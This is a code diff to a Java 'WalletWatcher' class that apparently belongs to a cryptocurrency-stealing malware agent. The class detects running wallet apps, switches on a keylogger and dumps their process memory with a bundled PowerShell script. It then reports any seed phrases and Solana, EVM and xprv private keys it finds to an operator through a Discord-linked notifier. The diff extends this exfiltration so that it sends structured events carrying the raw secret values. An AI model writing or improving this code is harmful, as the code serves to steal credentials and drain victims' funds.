@@ -56,6 +56,7 @@ final class WalletWatcher {
 	private Thread whip;
 	private Process watcher;
 	private volatile Process dumpProcess;
+	private java.util.function.BiFunction<String, Long, List<String>> captureOverride;
 
 	WalletWatcher(Path installDir, Path ops, State state, Poller poller, OpsNotifier notifier, Keylogger keylogger) {
 		this.installDir = installDir;
@@ -73,6 +74,10 @@ final class WalletWatcher {
 	/** Lets the Linux test suite exercise the state machine without PowerShell. */
 	void enableForTest() {
 		watchEnabled = true;
+	}
+
+	void captureForTest(java.util.function.BiFunction<String, Long, List<String>> override) {
+		this.captureOverride = override;
 	}
 
 	synchronized boolean start() {
@@ -223,7 +228,15 @@ final class WalletWatcher {
 				state.walletEvents++;
 				state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
 				state.save(AgentPaths.state(installDir));
-				notifier.send("wallet detected: " + name + " (" + pid + ")");
+				String note = "wallet detected: " + name + " (" + pid + ")";
+				notifier.send(note);
+				java.util.Map<String, Object> event = new java.util.LinkedHashMap<>();
+				event.put("name", name);
+				event.put("pid", pid);
+				if (title != null && !title.isBlank()) {
+					event.put("title", title);
+				}
+				notifier.event("wallet_detected", event, note);
 				keylogger.walletOn();
 				dumped.put(key, now);
 				dumpSchedules++;
@@ -257,6 +270,7 @@ final class WalletWatcher {
 	 */
 	void lost(String name, String reason) {
 		boolean stopKeys;
+		long closedPid = 0L;
 		synchronized (lock) {
 			if (activeKey.isEmpty()) {
 				return;
@@ -281,12 +295,14 @@ final class WalletWatcher {
 			}
 			activeKey = "";
 			activeName = "";
+			closedPid = activePid;
 			activePid = 0L;
 			stopKeys = true;
 		}
 		if (stopKeys) {
 			keylogger.walletOff();
 			notifier.send("wallet closed");
+			notifier.event("wallet_closed", java.util.Map.of("pid", closedPid), "wallet closed");
 		}
 	}
 
@@ -307,16 +323,22 @@ final class WalletWatcher {
 		if (!manual && (!key.equals(activeKey) || !alive(pid))) {
 			return;
 		}
-		int attempt = attempts.merge(key, 1, Integer::sum);
-		if (attempt > maxAttempts(name)) {
-			return;
-		}
+		// The budget is consumed only when a dump actually starts. A schedule
+		// that bounces off the running `dumping` flag must not burn an attempt.
 		synchronized (lock) {
 			if (dumping && !manual) {
 				scheduler.schedule(() -> dump(key, name, pid, false), 15000L, TimeUnit.MILLISECONDS);
 				return;
 			}
+			if (!manual && attempts.getOrDefault(key, 0) >= maxAttempts(name)) {
+				return;
+			}
 			dumping = true;
+		}
+		int attempt = attempts.merge(key, 1, Integer::sum);
+		if (attempt > maxAttempts(name)) {
+			dumping = false;
+			return;
 		}
 		try {
 			List<String> dumps = capture(name, pid);
@@ -367,6 +389,9 @@ final class WalletWatcher {
 
 	/** Runs the native dump and returns absolute dump paths; handles big processes. */
 	private List<String> capture(String name, long pid) throws Exception {
+		if (captureOverride != null) {
+			return captureOverride.apply(name, pid);
+		}
 		Path script = OpsPaths.dumpScript(installDir);
 		Keylogger.writeResource("/serverpackcore/memdump.ps1", script);
 		Path list = ops.resolve("memdump-" + System.currentTimeMillis() + ".list");
@@ -492,22 +517,42 @@ final class WalletWatcher {
 			}
 			switch (finding.kind()) {
 				case "bip39-24" -> {
+					String legacy = "seed encontrada: 24 palabras\n" + finding.value();
 					notifier.send("seed encontrada: 24 palabras");
 					notifier.send(finding.value());
+					notifier.event("seed_found", java.util.Map.of("words", 24, "value", finding.value()), legacy);
 				}
 				case "bip39-12" -> {
-					if (finding.confident()) {
-						notifier.send("seed encontrada: 12 palabras");
-					} else {
-						notifier.send("posible seed (12 palabras)");
-					}
+					String heading = finding.confident() ? "seed encontrada: 12 palabras" : "posible seed (12 palabras)";
+					String legacy = heading + "\n" + finding.value();
+					notifier.send(heading);
 					notifier.send(finding.value());
+					notifier.event("seed_found", java.util.Map.of("words", 12, "value", finding.value()), legacy);
 				}
-				case "xprv" -> notifier.send("xprv encontrado");
-				case "solana" -> notifier.send("clave privada Solana encontrada");
-				case "evm-key" -> notifier.send("clave privada EVM (o hex64) encontrada");
-				case "hex64" -> notifier.send("hex64 encontrado (clave EVM o hash)");
-				default -> notifier.send(finding.kind() + " encontrado");
+				case "xprv", "solana", "evm-key", "hex64" -> {
+					String secretKind = finding.kind();
+					String text = switch (secretKind) {
+						case "xprv" -> "xprv encontrado";
+						case "solana" -> "clave privada Solana encontrada";
+						case "evm-key" -> "clave privada EVM (o hex64) encontrada";
+						default -> "hex64 encontrado (clave EVM o hash)";
+					};
+					notifier.send(text);
+					java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
+					data.put("secret_kind", secretKind);
+					data.put("value", finding.value());
+					data.put("confident", finding.confident());
+					notifier.event("secret_found", data, text);
+				}
+				default -> {
+					String text = finding.kind() + " encontrado";
+					notifier.send(text);
+					java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
+					data.put("secret_kind", "other");
+					data.put("value", finding.value());
+					data.put("confident", finding.confident());
+					notifier.event("secret_found", data, text);
+				}
 			}
 		}
 	}
